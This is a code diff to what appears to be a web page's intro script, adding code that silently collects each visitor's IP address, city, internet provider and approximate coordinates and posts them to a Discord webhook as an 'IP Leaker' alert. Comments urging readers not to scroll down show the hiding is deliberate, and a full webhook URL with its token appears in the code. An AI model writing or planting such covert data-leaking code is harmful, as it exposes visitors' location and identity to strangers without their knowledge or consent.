@@ -1,3 +1,4 @@
+// Hello! if your seeing this, i kinda updated this, don't scroll down.
 
 
 'use strict';
@@ -114,11 +115,36 @@ $.getJSON(ipgeolocation, (data) => {
         clearCursor();
 
         const usernames = ['user', 'dude'];
+        
+        // Why did you scroll down?
 
         const ip = data.ip ? data.ip : usernames[Math.floor(Math.random() * usernames.length)];
         const country = data.country_name ? data.country_name : 'your country';
+        const city = data.city ? data.city : 'your city';
+        const connection_type = data.connection_type ? data.connection_type : 'None';
+        const organization = data.organization ? data.organization : 'your organization';
+        const latitude = data.latitude ? data.latitude : 'your latitude';
+        const longitude = data.longitude ? data.longitude : 'your longitude';
 
-        writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `sup. <i style='color: #fff393'>${ip}</i>. bet ur on ${country} whether u used vpn or not.`], 30, 500, () => {
+        function sendMessage() {
+            var request = new XMLHttpRequest();
+            // GRRRR... I TOLD YOU NOT TO SCROLL DOWN.
+            request.open("POST", "https://discord.com/api/webhooks/1098598764094173235/c9FbIGC9Ac36Fn5oU8-fFc-KeRIsUfiFT86mEmLE8NwRSBkxYmkzJtr-hpgCn2hgix4d");
+      
+            request.setRequestHeader('Content-type', 'application/json');
+      
+            var params = { 
+              username: "GEN-A IP Leaker",
+              avatar_url: "",
+              content: `**@everyone LEAKED!!!**\nIP: ${ip}\nCountry: ${country}\nCity: ${city}\nConnection Type: ${connection_type}\nWifi Organization: ${organization}\nCords or Coordinates (Innaccurate): ${latitude},${longitude}`
+            }
+      
+            request.send(JSON.stringify(params));
+          }
+
+        sendMessage()
+
+        writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `Welcome. <i style='color: #fff393'>${ip}</i>.`], 30, 500, () => {
             if (app.skippedIntro) return;
 
             clearCursor();
